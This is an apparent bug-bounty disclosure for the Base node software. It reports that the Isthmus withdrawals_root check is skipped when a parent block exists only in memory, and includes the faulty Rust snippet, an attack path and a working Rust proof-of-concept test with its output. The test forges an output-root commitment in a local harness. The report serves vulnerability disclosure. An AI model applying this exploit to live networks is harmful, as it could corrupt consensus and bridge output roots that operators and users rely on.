# 75615 bc medium isthmus withdrawals root check is skipped for in memory parents

**Submitted on Apr 30th 2026 at 04:15:19 UTC by @iam0x04 for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75615
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk

## Description

### Brief/Intro

After Isthmus, `header.withdrawals_root` is used as the `L2ToL1MessagePasser` storage root in the L2 output root. The post-execution validator is supposed to bind that header field to the actual post-execution MessagePasser storage root.

In `OpEngineValidator::validate_block_post_execution_with_hashed_state`, this check is skipped when the parent state cannot be loaded from the canonical provider:

```rust
let Ok(state) = self.provider.state_by_block_hash(block.parent_hash()) else {
    return Ok(());
};
```

This is reachable because engine-tree execution supports parents that are still only in memory and not yet canonical.

## Vulnerability Details

* Skip on missing canonical parent state:\
  `crates/execution/node/src/engine.rs:129-145`\
  <https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/execution/node/src/engine.rs#L124-L152>
* Engine tree supports in-memory parent state:\
  `crates/execution/engine-tree/src/validator.rs:1215-1222`

  <https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/execution/engine-tree/src/validator.rs#L1210-L1223>
* Isthmus output root trusts header `withdrawals_root`:\
  `crates/consensus/engine/src/query.rs:104-110`

  <https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/consensus/engine/src/query.rs#L104-L110>

### Attack path

The malformed child payload must reach the Engine API / payload validation path while its parent is present only in the engine tree. The PoC models that state directly; it does not assume bridge finalization or direct withdrawal theft.

1. Insert an Isthmus parent payload that exists in the engine tree but is not yet available from the canonical provider.
2. Insert a child payload with a correct post-execution state root but forged `withdrawals_root`.
3. Post-execution validation skips the withdrawals-root check because parent lookup through the canonical provider fails.
4. If the child becomes canonical, output-root queries commit the forged `withdrawals_root`.

## Impact Details

A child payload can be accepted with a valid EVM `state_root` but an arbitrary Isthmus `withdrawals_root`. If that child is later canonicalized, `outputAtBlock` uses the header `withdrawals_root` directly as the output root's bridge storage root.

The PoC proves that the in-scope EL accepts and canonicalizes a block whose output root commits to a bridge storage root not produced by execution.

This is not a direct bridge-theft claim, but it is a broken consensus/output-root invariant in the Base-native EL validation path.

## Proof of Concept

Put this PoC at `crates/execution/runner/tests/poc_005_isthmus_withdrawals_root.rs`

### Run Instructions

From the repository root:

```bash
# (If not already built) install and build test-utils Solidity contracts
cd crates/utilities/test-utils/contracts
forge soldeer install
forge build
cd ../../../..

# Run the PoC test
env CARGO_ENCODED_RUSTFLAGS= cargo test -p base-node-runner --features test-utils \
  --test poc_005_isthmus_withdrawals_root -- --nocapture
```

The PoC intentionally includes a control case to show that the same forged root is rejected when the parent state is available from the canonical provider, and accepted only when the parent is engine-tree-only.

`poc_005_isthmus_withdrawals_root.rs`

```rust
//! Standalone PoC for skipped Isthmus withdrawals-root validation when the
//! payload parent only exists in the engine tree.

use std::{sync::Arc, time::Duration};

use alloy_eips::eip7685::Requests;
use alloy_primitives::{B64, B256, keccak256};
use alloy_provider::Provider;
use alloy_rpc_types::BlockNumberOrTag;
use alloy_rpc_types_engine::PayloadAttributes;
use base_common_rpc_types_engine::{BaseExecutionPayloadV4, BasePayloadAttributes};
use base_execution_chainspec::BaseChainSpec;
use base_node_runner::test_utils::{
    BLOCK_BUILD_DELAY_MS, BLOCK_TIME_SECONDS, GAS_LIMIT, L1_BLOCK_INFO_DEPOSIT_TX, TestHarness,
};
use base_test_utils::build_test_genesis;
use eyre::{Result, eyre};
use reth_provider::StateProviderFactory;
use tokio::time::sleep;

fn refresh_payload_hash(
    payload: &mut BaseExecutionPayloadV4,
    parent_beacon_block_root: B256,
    execution_requests: &Requests,
) -> Result<B256> {
    let mut block = payload.clone().into_block_raw()?;
    block.header.parent_beacon_block_root = Some(parent_beacon_block_root);
    block.header.requests_hash = Some(execution_requests.requests_hash());
    let block_hash = block.header.hash_slow();
    payload.payload_inner.payload_inner.payload_inner.block_hash = block_hash;
    Ok(block_hash)
}

fn set_withdrawals_root_unchecked(
    payload: &mut BaseExecutionPayloadV4,
    withdrawals_root: B256,
    parent_beacon_block_root: B256,
    execution_requests: &Requests,
) -> Result<B256> {
    payload.withdrawals_root = withdrawals_root;
    refresh_payload_hash(payload, parent_beacon_block_root, execution_requests)
}

fn payload_hash(payload: &BaseExecutionPayloadV4) -> B256 {
    payload.payload_inner.payload_inner.payload_inner.block_hash
}

fn output_root_hash(state_root: B256, bridge_storage_root: B256, block_hash: B256) -> B256 {
    let mut encoded = [0u8; 128];
    encoded[32..64].copy_from_slice(state_root.as_slice());
    encoded[64..96].copy_from_slice(bridge_storage_root.as_slice());
    encoded[96..128].copy_from_slice(block_hash.as_slice());
    keccak256(encoded)
}

async fn submit_payload(
    harness: &TestHarness,
    payload: BaseExecutionPayloadV4,
    parent_beacon_block_root: B256,
    execution_requests: Requests,
    label: &str,
) -> Result<B256> {
    let hash = payload_hash(&payload);
    let status = harness
        .engine()
        .new_payload(payload, vec![], parent_beacon_block_root, execution_requests)
        .await?;

    assert!(!status.status.is_invalid(), "{label} payload rejected: {status:?}");
    assert_eq!(status.latest_valid_hash, Some(hash));
    Ok(hash)
}

async fn build_payload_on_head(
    harness: &TestHarness,
    safe_hash: B256,
    head_hash: B256,
    timestamp: u64,
    parent_beacon_block_root: B256,
) -> Result<(BaseExecutionPayloadV4, Requests)> {
    let payload_attributes = BasePayloadAttributes {
        payload_attributes: PayloadAttributes {
            timestamp,
            parent_beacon_block_root: Some(parent_beacon_block_root),
            withdrawals: Some(vec![]),
            ..Default::default()
        },
        transactions: Some(vec![L1_BLOCK_INFO_DEPOSIT_TX]),
        gas_limit: Some(GAS_LIMIT),
        no_tx_pool: Some(true),
        min_base_fee: None,
        eip_1559_params: Some(B64::ZERO),
    };
    let fcu =
        harness.engine().update_forkchoice(safe_hash, head_hash, Some(payload_attributes)).await?;
    let payload_id = fcu.payload_id.ok_or_else(|| eyre!("FCU did not return payload ID"))?;

    sleep(Duration::from_millis(BLOCK_BUILD_DELAY_MS)).await;

    let envelope = harness.engine().get_payload_v4(payload_id).await?;
    let requests = if envelope.execution_requests.is_empty() {
        Requests::default()
    } else {
        Requests::new(envelope.execution_requests)
    };

    Ok((envelope.execution_payload, requests))
}

#[tokio::test]
async fn poc_isthmus_withdrawals_root_is_not_checked_for_in_memory_parent() -> Result<()> {
    let bogus_withdrawals_root = B256::repeat_byte(0x42);
    let mut genesis_config = build_test_genesis();
    genesis_config.config.extra_fields.remove("jovianTime");
    let chain_spec = Arc::new(BaseChainSpec::from_genesis(genesis_config));
    let harness = TestHarness::builder().with_chain_spec(chain_spec).build().await?;

    let genesis = harness
        .provider()
        .get_block_by_number(BlockNumberOrTag::Latest)
        .await?
        .ok_or_else(|| eyre!("No genesis block found"))?;
    let canonical_head = genesis.header.hash;
    let parent_beacon_block_root = genesis.header.parent_beacon_block_root.unwrap_or(B256::ZERO);

    let (canonical_parent_payload, canonical_parent_requests) = build_payload_on_head(
        &harness,
        canonical_head,
        canonical_head,
        genesis.header.timestamp + BLOCK_TIME_SECONDS,
        parent_beacon_block_root,
    )
    .await?;
    let canonical_parent_hash = submit_payload(
        &harness,
        canonical_parent_payload,
        parent_beacon_block_root,
        canonical_parent_requests,
        "canonical parent",
    )
    .await?;
    harness.engine().update_forkchoice(canonical_head, canonical_parent_hash, None).await?;

    let (canonical_child_payload, canonical_child_requests) = build_payload_on_head(
        &harness,
        canonical_head,
        canonical_parent_hash,
        genesis.header.timestamp + (2 * BLOCK_TIME_SECONDS),
        parent_beacon_block_root,
    )
    .await?;
    let canonical_child_hash = submit_payload(
        &harness,
        canonical_child_payload.clone(),
        parent_beacon_block_root,
        canonical_child_requests.clone(),
        "canonical child",
    )
    .await?;
    harness.engine().update_forkchoice(canonical_head, canonical_child_hash, None).await?;

    let (canonical_grandchild_payload, canonical_grandchild_requests) = build_payload_on_head(
        &harness,
        canonical_head,
        canonical_child_hash,
        genesis.header.timestamp + (3 * BLOCK_TIME_SECONDS),
        parent_beacon_block_root,
    )
    .await?;
    let actual_bridge_storage_root = canonical_grandchild_payload.withdrawals_root;

    let mut canonical_parent_control = canonical_grandchild_payload.clone();
    set_withdrawals_root_unchecked(
        &mut canonical_parent_control,
        bogus_withdrawals_root,
        parent_beacon_block_root,
        &canonical_grandchild_requests,
    )?;
    let canonical_status = harness
        .engine()
        .new_payload(
            canonical_parent_control,
            vec![],
            parent_beacon_block_root,
            canonical_grandchild_requests.clone(),
        )
        .await?;
    assert!(
        canonical_status.status.is_invalid(),
        "control failed: canonical DB-backed parent should reject bogus withdrawals_root, got {canonical_status:?}"
    );

    let mut side_parent_payload = canonical_child_payload;
    side_parent_payload.payload_inner.payload_inner.payload_inner.prev_randao =
        B256::repeat_byte(0x99);
    let side_parent_hash = refresh_payload_hash(
        &mut side_parent_payload,
        parent_beacon_block_root,
        &canonical_child_requests,
    )?;
    assert_ne!(side_parent_hash, canonical_child_hash);

    assert_eq!(
        submit_payload(
            &harness,
            side_parent_payload,
            parent_beacon_block_root,
            canonical_child_requests,
            "side parent",
        )
        .await?,
        side_parent_hash
    );
    assert!(
        harness.blockchain_provider().state_by_block_hash(side_parent_hash).is_err(),
        "PoC precondition: side parent is accepted by engine_newPayload but has no DB-backed state"
    );

    let mut child_payload = canonical_grandchild_payload;
    child_payload.payload_inner.payload_inner.payload_inner.parent_hash = side_parent_hash;
    let valid_state_root = child_payload.payload_inner.payload_inner.payload_inner.state_root;
    let child_hash = set_withdrawals_root_unchecked(
        &mut child_payload,
        bogus_withdrawals_root,
        parent_beacon_block_root,
        &canonical_grandchild_requests,
    )?;
    assert!(
        harness.blockchain_provider().state_by_block_hash(side_parent_hash).is_err(),
        "PoC precondition: child validation parent is still in the engine tree, not DB state"
    );

    assert_eq!(
        submit_payload(
            &harness,
            child_payload,
            parent_beacon_block_root,
            canonical_grandchild_requests,
            "bogus withdrawals_root child",
        )
        .await?,
        child_hash
    );

    harness.engine().update_forkchoice(canonical_head, child_hash, None).await?;
    sleep(Duration::from_millis(BLOCK_BUILD_DELAY_MS)).await;

    let latest = harness
        .provider()
        .get_block_by_number(BlockNumberOrTag::Latest)
        .await?
        .ok_or_else(|| eyre!("No latest block found after child forkchoice"))?;
    assert_eq!(latest.header.hash, child_hash);
    assert_eq!(latest.header.state_root, valid_state_root);
    assert_eq!(latest.header.withdrawals_root, Some(bogus_withdrawals_root));

    let honest_output_root =
        output_root_hash(latest.header.state_root, actual_bridge_storage_root, latest.header.hash);
    let forged_output_root =
        output_root_hash(latest.header.state_root, bogus_withdrawals_root, latest.header.hash);
    assert_ne!(
        forged_output_root, honest_output_root,
        "changing only withdrawals_root must change the L2 output root"
    );

    println!("actual bridge storage root: {actual_bridge_storage_root:?}");
    println!("forged bridge storage root: {bogus_withdrawals_root:?}");
    println!("honest output root: {honest_output_root:?}");
    println!("forged output root accepted by header path: {forged_output_root:?}");

    Ok(())
}
```

Observed locally: the test passes. It first confirms the same forged `withdrawals_root` is rejected for a canonical DB-backed parent, then submits the child against an engine-tree-only parent and confirms the block is canonicalized with the valid `state_root` and forged `withdrawals_root`. The test also computes the V0 output root hash input and shows the canonicalized header path commits to the forged bridge storage root.

Key observed output:

```
Invalid block error on new payload ... validation_err=failed to verify block post-execution: L2 withdrawals root mismatch, header: 0x4242...
Block added to fork chain number=2 hash=0xc841...
Block added to canonical chain number=3 hash=0x9775...
actual bridge storage root: 0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421
forged bridge storage root: 0x4242424242424242424242424242424242424242424242424242424242424242
honest output root: 0xf862af5e42996d722b926cfb4531964a9aed92e1cdcf5ca69438cc6c7f6e9425
forged output root accepted by header path: 0xcafc6d166aee6a2d3620ddbc144c3e6389672a296950293feabbceb0f2d2b6e3
test poc_isthmus_withdrawals_root_is_not_checked_for_in_memory_parent ... ok
```

The first line is the control case: a forged `withdrawals_root` is rejected when the parent is canonical and DB-backed. The later canonical-chain line is the bug case: the same forged root is accepted after switching the payload parent to an engine-tree-only side parent. The output-root lines show that changing only the bridge storage root from the actual execution result to the forged header value changes the final L2 output root. The accepted header path therefore commits to `0x4242...` as the withdrawal/message-passer storage root.
